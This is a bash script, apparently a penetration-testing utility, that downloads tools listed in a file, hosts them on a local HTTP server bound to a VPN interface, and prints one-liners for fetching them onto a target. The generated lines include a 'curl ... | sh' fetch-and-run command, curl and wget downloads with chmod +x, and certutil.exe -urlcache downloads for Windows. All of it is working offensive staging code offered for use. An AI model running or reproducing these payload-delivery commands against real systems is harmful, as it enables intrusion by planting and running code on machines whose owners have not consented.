#!/bin/bash

function help() {
    echo "Example: $0 --file windows.peh --interface eth0"
    echo "Example: $0 -f linux.peh -i tun0 -p 53"
    echo ""
    echo "    -h, --help"
    echo "        Prints this message."
    echo "    -f, --file    <FILE>"
    echo "        Set peh file from where to load tool links to download."
    echo "    -i, --interface    <INTERFACE>"
    echo "        Set on which interface to listen (default: tun0)."
    echo "    -p, --port    <PORT>"
    echo "        Set on which port to listen (default: 8990)."
    echo ""
    exit 2
}

PARSED_ARGUMENTS=$(getopt -a -n peh -o 'hf:i:p:' --long 'help,file:,interface:,port:' -- "$@")
VALID_ARGUMENTS=$?
if [ "$VALID_ARGUMENTS" != "0" ]; then
  help
fi

eval set -- "$PARSED_ARGUMENTS"
while :
do
    case "$1" in
        -h | --help) PRINT_HELP=1 ; shift ;;
        -f | --file) FILE_PATH="$2" ; shift 2 ;;
        -i | --interface) INTERFACE="$2" ; shift 2 ;;
        -p | --port) PORT="$2"; shift 2 ;;
        --) shift; break ;;
        *) echo "Unexpected option: $1 - this should not happen."; PRINT_HELP=1; break ;;
  esac
done

if [ "$PRINT_HELP" == "1" ]; then
    help
fi

if [ "$FILE_PATH" == "" ];then
    echo "-f, --file argument missing"
    exit 4
fi

TOOL_URLS=$(cat $FILE_PATH)
ARCH=$(echo "$FILE_PATH" | cut -d'.' -f1)

if [ "$PORT" == "" ];then
    LPORT=8990
else
    LPORT=$PORT
fi

if [ "$INTERFACE" == "" ];then
    INTERFACE=tun0
fi

LHOST=$(ip a | grep "$INTERFACE" | grep inet | cut -d' ' -f 6 | cut -d'/' -f 1)

if [ "$LHOST" == "" ];then
    echo "Cannot extract IP address from the current interface ($INTERFACE)."
    echo "Check selected interface with 'ip a' command if it has assigned an IP address."
    exit 3
fi

mkdir www
cd www

if [ $ARCH == "linux" ]; then
    echo "#!/bin/sh" > download.sh
fi

if [ $ARCH == "windows" ]; then
    echo "@ECHO off" > download.bat
fi

for TOOL_URL in $TOOL_URLS; do
    
    TOOL_NAME=$(echo $TOOL_URL | rev | cut -d'/' -f 1 | rev)

    if [ ! -f "$TOOL_NAME" ]; then
        echo "Downloading '$TOOL_NAME'..."
        wget "$TOOL_URL" -O "$TOOL_NAME" -q
    else
        echo "'$TOOL_NAME' already downloaded"
    fi

    if [ $ARCH == "linux" ]; then
        echo "curl http://$LHOST:$LPORT/$TOOL_NAME > $TOOL_NAME; chmod +x $TOOL_NAME" >> download-curl.sh
        echo "wget http://$LHOST:$LPORT/$TOOL_NAME; chmod +x $TOOL_NAME" >> download-wget.sh
    fi
    if [ $ARCH == "windows" ]; then
        echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/$TOOL_NAME $TOOL_NAME" >> download.bat
    fi

done

if [ $ARCH == "linux" ]; then
    echo ""
    echo "curl http://$LHOST:$LPORT/download-curl.sh | sh"
    echo "wget http://$LHOST:$LPORT/download-wget.sh ; sh download-wget.sh"
    echo ""
fi
if [ $ARCH == "windows" ]; then
    echo ""
    echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/download.bat download.bat"
    echo ""
fi

if [ $LPORT -lt 1024 ]; then
  echo "Port is less than 1024, you need to provide your password..."
  sudo python3 -m http.server $LPORT
else
  python3 -m http.server $LPORT
fi

